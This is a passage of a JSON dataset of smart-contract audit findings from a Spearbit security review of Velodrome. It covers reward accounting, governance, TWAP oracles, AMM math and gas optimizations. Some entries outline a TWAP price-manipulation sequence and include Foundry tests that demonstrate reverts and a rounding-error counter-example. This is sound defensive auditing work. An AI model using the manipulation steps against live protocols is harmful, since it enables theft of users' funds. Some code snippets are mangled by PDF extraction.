        "body": "Due to how left() is implemented in Reward (returning the total amount of rewards for the epoch), _claimFees() will not queue rewards until the new fees are greater than the current ones for the epoch. This can cause the check to be false for values that are up to half minus one reward. Consider the following example:  First second of a new epoch, we add 100 rewards.  For the rest of the epoch, we accrue 99.99 rewards.  The check is always false, the 99 rewards will not be added to this epoch, despite having accrued them during this epoch.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Not synced with Epochs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "If there's enough delays in calling the notifyRewardAmount() function, a full desync can happen.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Dust losses in notifyRewardAmount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "This should cause dust losses which are marginal but are never queued back. See private link to code-423n4/2022-10-3xcalibur-findings#410. Vs SNX implementation which does queue the dust back. Users may be diluted by distributing the _leftover amount of another epoch period of length DURATION if the total supply deposited in the gauge continues to increase over this same period. On the flip side, they may also benefit if users withdraw funds from the gauge during the same epoch.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "All rewards are lost until Gauge or Bribe deposits are non-zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Flagging this old finding which is still valid for all SNX like gauges. See private link to code- 423n4/2022-10-3xcalibur-findings#429. Because the rewards are emitted over DURATION, if no deposit has happened and notifyRewardAmount() is called with a non-zero value, all rewards will be forfeited until totalSupply is non-zero as nobody will be able to claim them.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Difference in getPastTotalSupply and propose",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The getPastTotalSupply() function currently uses block.number, but OpenZeppelin's propose() function will use votes from block.timestamp - 1 as seen here. This could enable  Front-run and increase total supply to cause proposer to be unable to propose().  Require higher tokens than expected if total supply can grow within one block. Proposals could be denied as long as a whale is willing to lock more tokens to increase the total supply and thereby increase the proposal threshold.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Delaying update_period may award more emissions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "First nudge can be performed on the first tail period, delaying update_period() may award more emissions, because of the possible delay with the first proposal, waiting to call update_period() will allow the use of the updated nudged value. This is marginal (1BPS in difference)",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Incorrect math for future factories and pools",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Because quoteLiquidity() assumes an x * y = k formula, its quote value will be incorrect when using a custom factory that uses a different curve. //Router.sol#L673-L700 function _quoteZapLiquidity( address tokenA, address tokenB, bool stable, address _factory, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin ) internal view returns (uint256 amountA, uint256 amountB) { require(amountADesired >= amountAMin); require(amountBDesired >= amountBMin); (uint256 reserveA, uint256 reserveB) = getReserves(tokenA, tokenB, stable, _factory); if (reserveA == 0 && reserveB == 0) { (amountA, amountB) = (amountADesired, amountBDesired); } else { uint256 amountBOptimal = quoteLiquidity(amountADesired, reserveA, reserveB); if (amountBOptimal <= amountBDesired) { require(amountBOptimal >= amountBMin, \"Router: insufficient B amount\"); (amountA, amountB) = (amountADesired, amountBOptimal); } else { uint256 amountAOptimal = quoteLiquidity(amountBDesired, reserveB, reserveA); assert(amountAOptimal <= amountADesired); require(amountAOptimal >= amountAMin, \"Router: insufficient A amount\"); (amountA, amountB) = (amountAOptimal, amountBDesired); } } } The math may be incorrect for future factories and pools, while the current math is valid for x * y = k, any new AMM math (e.g Bounded / V3 math, Curve V2, Oracle driven AMMs) may turn out to be incorrect. This may cause issues when performing zaps with custom factories.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Add function to remove whitelisted token and NFT",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "In the Voter contract, the governor can only add tokens and NFTs to the whitelist array. However, it is missing the functionality to remove whitelisted tokens and NFTs. If any whitelisted token or NFT has an issue, it cannot be removed from the list.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unnecessary approve in Router",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The newly added Zap feature uses max approvals, which are granted to pairs. However, the Pair contract does not pull tokens from the router, and therefore unnecessarily calls approve() in the router. Because of the possibility of specifying a custom factory, attackers will be able to set up approvals from any token to their contracts. This may be used to scam end-users, for example by performing a swap on these malicious factories.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The current value of a Pair is not always returning a 30-minute TWAP and can be manipulated.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The current function returns a current TWAP. It fetches the last observation and calculates the TWAP between the last observation. The observation is pushed every thirty minutes. However, the interval between current timestamp and the last observation varies a lot. In most cases, the TWAP interval is shorter than 30 minutes. //Pair.sol#L284-L288 uint256 timeElapsed = block.timestamp - _observation.timestamp; @audit: timeElapsed can be much smaller than 30 minutes. uint256 _reserve0 = (reserve0Cumulative - _observation.reserve0Cumulative) / timeElapsed; uint256 _reserve1 = (reserve1Cumulative - _observation.reserve1Cumulative) / timeElapsed; amountOut = _getAmountOut(amountIn, tokenIn, _reserve0, _reserve1); If the last observation is newly updated, the timeElapsed will be much shorter than 30 minutes. The cost of price manipulation is cheaper in this case. Assume the last observation is updated at T. The exploiter can launch an attack at T + 30_MINUTES - 1 1. At T + 30_MINUTES - 1, the exploiter tries to manipulate the price of the pair. Assume the price is moved to 100x. 2. At T + 30_MINUTES, the exploiter pokes the pair. The pair push an observation with the price = 100x. 3. At T + 30_MINUTES + 1, the exploiter tries to exploit external protocols. The current function fetches the It ends up last observation and calculates the TWAP between the last observation and the current price. calculating the two-block-interval TWAP.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Calculation error of getAmountOut leads to revert of Router",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The function getAmountOut in Pair calculates the correct swap amount and token price. //Pair.sol#L442-L444 function _f(uint256 x0, uint256 y) internal pure returns (uint256) { return (x0 * ((((y * y) / 1e18) * y) / 1e18)) / 1e18 + (((((x0 * x0) / 1e18) * x0) / 1e18) * y) / ,! 1e18; } //Pair.sol#L450-L476 function _get_y( uint256 x0, uint256 xy, uint256 y ) internal pure returns (uint256) { for (uint256 i = 0; i < 255; i++) { uint256 y_prev = y; uint256 k = _f(x0, y); if (k < xy) { uint256 dy = ((xy - k) * 1e18) / _d(x0, y); y = y + dy; } else { uint256 dy = ((k - xy) * 1e18) / _d(x0, y); y = y - dy; } if (y > y_prev) { if (y - y_prev <= 1) { return y; } } else { if (y_prev - y <= 1) { return y; } } } return y; } The getAmountOut is not always correct. This results in the router unexpectedly revert a regular and correct transaction. We can find one parameter that the router will fail to swap within 5s fuzzing. 36 function testAmountOut(uint swapAmount) public { vm.assume(swapAmount < 1_000_000_000 ether); vm.assume(swapAmount > 1_000_000); uint256 reserve0 = 100 ether; uint256 reserve1 = 100 ether; uint amountIn = swapAmount - swapAmount * 2 / 10000; uint256 amountOut = _getAmountOut(amountIn, token0, reserve0, reserve1); uint initialK = _k(reserve0, reserve1); reserve0 += amountIn; reserve1 -= amountOut; console.log(\"initial k:\", initialK); console.log(\"curent k:\", _k(reserve0, reserve1)); console.log(\"curent smaller k:\", _k(reserve0, reserve1 - 1)); require(initialK < _k(reserve0, reserve1), \"K\"); require(initialK > _k(reserve0, reserve1-1), \"K\"); } After the fuzzer have a counter example of swapAmount = 1413611527073436 We can test that the Router will revert if given the fuzzed params. contract PairTest is BaseTest { function testRouterSwapFail() public { Pair pair = Pair(factory.createPair(address(DAI), address(FRAX), true)); DAI.approve(address(router), 100 ether); FRAX.approve(address(router), 100 ether); _addLiquidityToPool( address(this), address(router), address(DAI), address(FRAX), true, 100 ether, 100 ether ); uint swapAmount = 1413611527073436; DAI.approve(address(router), swapAmount); // vm.expectRevert(); console.log(\"fee:\", factory.getFee(address(pair), true)); IRouter.Route[] memory routes = new IRouter.Route[](1); routes[0] = IRouter.Route(address(DAI), address(FRAX), true, address(0)); uint daiAmount = DAI.balanceOf(address(pair)); uint FRAXAmount = FRAX.balanceOf(address(pair)); console.log(\"daiAmount: \", daiAmount, \"FRAXAmount: \", FRAXAmount); vm.expectRevert(\"Pair: K\"); router.swapExactTokensForTokens(swapAmount, 0, routes, address(owner), block.timestamp); } }",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "VotingEscrow checkpoints is not synchronized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Delegating token ids is not synchronizing correctly fromBlock variable in the checkpoint, by leaving it not updated the functions getPastVotesIndex and _findWhatCheckpointToWrite could return the incorrect index.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Wrong proposal expected value in VeloGovernor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The expected values of MAX_PROPOSAL_NUMERATOR and proposalNumerator are incorrect, in the current implementation max proposal is set to 0.5%, the expected value is 5%, and the proposal numerator starts at 0.02%, and not at 0.2% as expected.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_burn function will always revert if the caller is the approved spender",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The owner or the approved spender is allowed to trigger the _burn function. However, whenever an approved spender triggers this function, it will always revert. This is because the _removeTokenFrom function will revert internally if the caller is not the owner of the NFT as shown below. function _removeTokenFrom(address _from, uint256 _tokenId) internal { // Throws if `_from` is not the current owner assert(idToOwner[_tokenId] == _from); As a result, an approved spender will not be able to withdraw or merge a veNFT on behalf of the owner because the internal _burn function will always revert.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "OpenZeppelin's Clones library can be used to cheaply deploy rewards contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "OpenZeppelin's Clones library allows for significant gas savings when there are multiple deploy- ments of the same family of contracts. This would prove useful in several factory contracts which commonly deploy the same type of contract. Minimal proxies make use of the same code even when initialization data may be different for each instance. By pointing to an implementation contract, we can delegate all calls to a fixed address and minimise deployment costs.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "VelodromeTimeLibrary functions can be made unchecked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Running the following fuzz test pragma solidity 0.8.13; import \"forge-std/Test.sol\"; contract VelodromeTimeLibrary { uint256 public constant WEEK = 7 days; /// @dev Returns start of epoch based on current timestamp function epochStart(uint256 timestamp) public pure returns (uint256) { unchecked { return timestamp - (timestamp % WEEK); } } /// @dev Returns unrestricted voting window function epochEnd(uint256 timestamp) public pure returns (uint256) { unchecked { 40 return timestamp - (timestamp % WEEK) + WEEK - 1 hours; } } } contract VelodromeTimeLibraryTest is Test { VelodromeTimeLibrary vtl; uint256 public constant WEEK = 7 days; function setUp() public { vtl = new VelodromeTimeLibrary(); } function testEpochStart(uint256 timestamp) public { uint256 uncheckedVal = uint256 normalVal = timestamp - (timestamp % WEEK); assertEq(uncheckedVal, normalVal); vtl.epochStart(timestamp); } function testEpochEnd(uint256 timestamp) public { uint256 uncheckedVal = vtl.epochEnd(timestamp); uint256 normalVal = timestamp - (timestamp % WEEK) + WEEK - 1 hours; assertEq(uncheckedVal, normalVal); } } One can see that both VelodromeTimeLibrary functions will only start to overflow at a ridiculously high timestamp input.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Skip call can save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "distribute(address[] memory _gauges) is meant to be used for multiple gauges but it calls minter.update_period before each call to notifyRewardAmount",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Change to zero assignment to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "It is not necessary to subtract the total value from the votes instead you should set it directly to zero.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Refactor to skip an SLOAD",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "It is possible to skip an SLOAD by refactoring the code as it is in recommendation.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Tail variable can be removed to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "It is possible to save gas by freeing the tail slot, which can be replaced by check weekly < TAIL_- START",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use a bitmap to store nudge proposals for each epoch",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The usage of a bitmap implementation for boolean values can save a significant amount of gas. The proposals variable can be indexed by each epoch which should only increment once per week.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "isApproved function optimization",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Because settings are all known, you could do an if-check in memory rather than in storage, by validating first the fallback settings. The recommended implementation will become cheaper for the base case, negligibly more expensive in other cases ~10s of gas",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use calldata instead of memory to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Using calldata avoids copying the value into memory, reducing gas cost",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache store variables when used multiple times",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Storage loads are very expensive compared to memory loads, storage values that are read multiple times should be cached avoiding multiple storage loads. In SinkManager contract use multiple times the storage variable ownedTokenId",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Add immutable to variable that don't change",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Using immutable for variables that do not changes helps to save on gas used. The reason has been that immutable variables do not occupy a storage slot when compiled, they are saved inside the contract byte code.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use Custom Errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "As one can see here: \"there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert(\"Insufficient funds.\");), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\"",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache array length outside of loop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "If not cached, the solidity compiler will always read the length of the array during each iteration. That is, if it is a storage array, this is an extra sload operation (100 additional extra gas for each iteration except for the first) and if it is a memory array, this is an extra mload operation (3 additional gas for each iteration except for the first).",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Withdrawing from a managed veNFT locks the user's veNFT for the maximum amount of time",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "A user may deposit their veNFT through the depositManaged() function with any unlock time value. However, upon withdrawing, the unlock time is automatically configured to (block.timestamp + MAXTIME / WEEK) * WEEK. This is poor UX and it does not give users much control over the expiry time of their veNFT.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "veNFT split functionality can not be disabled",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Once split functionality has been enabled via the enableSplitForAll(), it is not possible to disable this feature in the future. It does not pose any additional risk to have it disabled once users have already split their veNFTs because the protocol allows for these locked amounts to be readily withdrawn upon expiry.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Anyone can notify the FeesVotingReward contract of new rewards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "While the BribeVotingReward contract intends to allow bribes from anyone, the FeesVotingReward contract is designed to receive fees from just the Gauge contract. This is inconsistent with other reward contracts like LockedManagedReward.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing check in merge if the _to NFT has voted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The merge() function is used to combine a _from VeNFT into a _to veNFT. It starts with a check on if the _from VeNFT has voted or not. However, it doesn't check if the _to VeNFT has voted or not. This will cause the user to have less voting power, leaving rewards and/or emissions on the table, if they don't call poke() || reset(). Although this would only be an issue for an unaware user. An aware user would still have to waste gas on either of the following: 1. An extra call to poke() || reset(). 2. Vote with the _to veNFT and then call merge().",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Ratio of invariant _k to totalSupply of the AMM pool may temporarily decrease",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The burn function directly sends the reserve pro-rated to the liquidity token. This is a simple and elegant way. Nevertheless, two special features of the current AMM would lead to a weird situation. 1. The fee of the AMM pool is sent to the fee contract instead of being absorbed into the pool; 2. The stable pool's curve x3y + y3x have a larger rounding error compare to uni-v2's constant product formula. The invariant K in a stable pool can decrease temporarily when a user performs certain actions like minting a token, doing a swap, and withdrawing liquidity. This means that the ratio of K to the total supply of the pool is not monotonously increasing. In most cases, this temporary decrease is negligible and the ratio of K to the total supply of the pool will eventually increase again. However, the ratio of K to the total supply is an important metric for calculating the value of LP tokens, which are used in many protocols. If these protocols are not aware of the temporary decrease in the K value, they may suffer from serious issues (e.g. overflow). The root cause of this issue is: there are always rounding errors when using \"balance\" to calculate invariant k. Sometimes, the rounding error is larger. if an lp is minted when the rounding error is small (ratio of amount: k is small) and withdrawn when the rounding error is large (ratio of amount: k is large). The total invariant decreased. We can find a counter-example where the invariant decrease. function testRoundingErrorAttack(uint swapAmount) public { // The counter-example: swapAmount = 52800410888861351333 vm.assume(swapAmount < 100_000_000 ether); vm.assume(swapAmount > 10 ether); uint reserveA = 10 ether; uint reserveB = 10 ether; uint initialK = _k(reserveA, reserveB); reserveA *= 2; reserveB *= 2; uint tempK = _k(reserveA, reserveB); reserveB -= _getAmountOut(swapAmount, token0, reserveA, reserveB); reserveA += swapAmount; vm.assume(tempK <= _k(reserveA, reserveB)); reserveA -= reserveA / 2; reserveB -= reserveB / 2; require(_k(reserveA, reserveB) > } initialK, \"Rounding error attack!\"); 47",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistent check for adding value to a lock",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "depositFor allows anyone to add value to an existing lock However increaseAmount, which for NORMAL locks is idempotent, has a check to only allow an approved or Owner to increase the amount.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Privileged actors are incentivized to front-run each other",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Privileged actors are incentivized to front-run each other and vote at the last second, because of the FIFS OP sequencer, managers will try to vote exactly at the penultimate block in order to maximize their options (voting can only be done once)",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "First nudge propose must happen one epoch before tail is set to true",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Because you can only propose a nudge one epoch in advance, the first propose call will need to happen on the last epoch in which tail is set to false While the transaction simulation will fail for execute, the EpochGovernor.propose math will make it so that the first proposal will have to be initiated an epoch before in order for it to be executable on the first tail epoch",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing emit important events",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The contracts that change or create sensible information should emit an event.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Marginal rounding errors when using small values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "It may be helpful to encourage end users to use BPS or higher denominations for weights when dealing with multiple gauges to keep precision high. Due to widespread usage of the _vote function throughout the codebase and in forks, it may be best to suggest this in documentation to avoid reverts",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Prefer to use nonReentrant on external functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "it may be best to use nonReentrant on the external functions rather than the internal ones. Vote, for example, is not protected because the internal function is.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Redundant variable update",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "In notifyRewardAmount the variable lastUpdateTime is updated twice",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Turn logic into internal function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "In Gauge contract the logic to update rewardPerTokenStored,lastUpdateTime,rewards,userRewardsPerTokenPaid can be converted to internal function for simplicity",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add extra slippages on client-side when dependent paths are used in generateZapInParams",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "generateZapInParams is a helper function in Router that calculates the parameters for zapIn. there's a duplicate pair in RoutesA and RoutesB, the value calculated here would be off. For example, The optimal path to swap dai into usdc/velo pair would likely have dai/eth in both routesA and routesB. When the user uses this param to call zapIn, it executes two swaps: dai -> eth -> usdc, and dai -> eth -> velo. As the price of dai/eth is changed after the first swap, the second swap would have a slightly bad price. The zapIn will likely revert as it does not meet the min token return. If",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unnecessary skim in router",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The pair contract absorbs any extra tokens after swap, mint, and burn. Triggering Skim after burn/mint would not return extra tokens.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Overflow is not desired and can lead to loss of funds in Solidity 8.0.0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "In solidity 8.0, overflow of uint is defaulted to be reverted. //Pair.sol#L235-L239 uint256 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) { reserve0CumulativeLast += _reserve0 * timeElapsed; reserve1CumulativeLast += _reserve1 * timeElapsed; } reserve0CumulativeLast += _reserve0 * timeElapsed; This calculation will overflow and DOS the pair if _- reserve0 is too large. As a result, the pool should not support high decimals tokens.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unnecessary casting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "_totalWeight is already declared as uint256",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Refactor retrieve current epoch into library",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Could refactor to a library function to retrieve the current epoch",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add governor permission to sensible functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Some functions that change important variables could add governor permission to enable changes. The function setManagedState in VotingEscrow is one that is recommended to add governor permission.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Admin privilege through proposal threshold",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "As an Admin Privilege of the Team, the variable proposalNumerator could change causing the proposalThreshold to be higher than expected. The Team could front-run calls to propose and increase the numerator, this could block proposals",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Simplify check for rounding error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "The check of rounding error can be simplified. Instead using A / B > 0 use A > B",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Storage declarations in the middle of the file",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "If you wish to keep the logic separate, consider creating a separate abstract contract.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistent usage of _msgSender()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "There are some instances where msg.sender is used in contrast with _msgSender() function.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational Voter.sol#L75-L78,"
        ]
    },
    {
        "title": "Change emergency council should be enabled to Governor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Governor may also want to be able to set and change the emergency council, this avoids the potential risk of the council abusing their power",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unnecessary inheritance in Velo contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Velo isn't used for governance, therefore it's not necessary to inherit from ERC20Votes.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect value in Mint event",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "In Minter#update_period the Mint event is emitted with incorrect values.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Do not cache constants",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "It is not necessary to cache constant variable.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "First week will have no emissions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Cannot call update_period on the first week due to setting the current period to this one. Emissions will start at most one week after",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Variables can be renamed for better clarity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "For a better understanding, some variables could be renamed.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Minter week will eventually shift",
